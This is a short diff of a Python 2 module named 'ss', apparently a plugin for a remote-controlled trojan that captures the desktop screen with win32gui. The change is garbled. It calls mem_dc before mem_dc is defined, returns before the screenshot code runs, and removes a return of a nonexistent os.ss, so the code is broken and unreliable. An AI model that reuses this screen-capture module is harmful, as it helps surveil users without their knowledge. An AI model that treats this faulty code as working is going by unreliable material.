@@ -6,8 +6,13 @@ import win32api
 import os
 
 def run(**args):
+
     print "[*] In ss module."
-    
+    files = mem_dc(".")
+
+    return str(files)
+
+
 
 
     hdesktop = win32gui.GetDesktopWindow()
@@ -34,4 +39,3 @@ def run(**args):
     mem_dc.DeleteDC()
     win32gui.DeleteObject(screenshot.GetHandle())
 
-    return str(os.ss)
